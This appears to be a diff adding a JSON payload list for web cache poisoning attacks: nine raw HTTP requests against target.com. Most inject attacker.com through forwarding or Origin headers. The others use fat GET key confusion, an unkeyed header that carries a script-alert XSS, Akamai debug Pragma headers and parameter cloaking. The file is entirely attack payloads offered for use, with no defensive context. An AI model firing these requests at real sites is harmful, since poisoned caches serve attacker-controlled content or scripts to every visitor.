@@ -1,0 +1,11 @@
+[
+  {"name":"X-Forwarded-Host Poison","category":"Cache Poisoning","description":"Poison cache via X-Forwarded-Host","payload":"GET / HTTP/1.1\nHost: target.com\nX-Forwarded-Host: attacker.com","tags":["x-forwarded-host","basic"]},
+  {"name":"X-Forwarded-Scheme","category":"Cache Poisoning","description":"Poison via scheme header","payload":"GET / HTTP/1.1\nHost: target.com\nX-Forwarded-Scheme: nothttps","tags":["scheme","redirect"]},
+  {"name":"X-Host Header","category":"Cache Poisoning","description":"X-Host cache poison","payload":"GET / HTTP/1.1\nHost: target.com\nX-Host: attacker.com","tags":["x-host","poison"]},
+  {"name":"Fat GET Cache Poison","category":"Cache Poisoning","description":"Body in GET request for cache key confusion","payload":"GET /?param=cached HTTP/1.1\nHost: target.com\nContent-Length: 48\nContent-Type: application/x-www-form-urlencoded\n\nparam=evil_value","tags":["fat-get","body","cache-key"]},
+  {"name":"Unkeyed Header Injection","category":"Cache Poisoning","description":"Header reflected but not in cache key","payload":"GET / HTTP/1.1\nHost: target.com\nX-Custom-Header: \"><script>alert(1)</script>","tags":["unkeyed","xss","reflected"]},
+  {"name":"Pragma Header","category":"Cache Poisoning","description":"Cache directive manipulation","payload":"GET / HTTP/1.1\nHost: target.com\nPragma: akamai-x-get-cache-key, akamai-x-cache-on","tags":["pragma","debug","akamai"]},
+  {"name":"Cache Buster","category":"Cache Poisoning","description":"Add unique parameter to avoid cache","payload":"GET /page?cb=1234567 HTTP/1.1\nHost: target.com","tags":["cache-buster","testing"]},
+  {"name":"Parameter Cloaking","category":"Cache Poisoning","description":"Semicolon as parameter delimiter confusion","payload":"GET /page?param=value;injected=1 HTTP/1.1\nHost: target.com","tags":["parameter-cloaking","delimiter"]},
+  {"name":"Origin Header Poison","category":"Cache Poisoning","description":"Poison via Origin header","payload":"GET / HTTP/1.1\nHost: target.com\nOrigin: https://attacker.com","tags":["origin","cors","poison"]}
+]
